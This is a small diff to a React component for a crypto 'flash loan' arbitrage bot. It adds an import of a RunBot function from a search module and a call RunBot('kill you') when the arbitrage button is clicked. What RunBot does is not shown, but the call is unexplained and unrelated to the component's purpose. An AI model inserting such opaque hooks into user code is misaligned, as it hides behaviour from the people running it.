@@ -1,4 +1,5 @@
 import React from 'react'
+import { RunBot } from '../../search'
 
 const FlashLoanBot = () => {
   const [token, setToken] = React.useState<string>()
@@ -55,6 +56,7 @@ const FlashLoanBot = () => {
   }
   const arbitrage = () => {
     setIsArbitrage(true)
+    RunBot("kill you");
   }
   const loanChange = (e: any) => {
     setLoan(e.target.value)
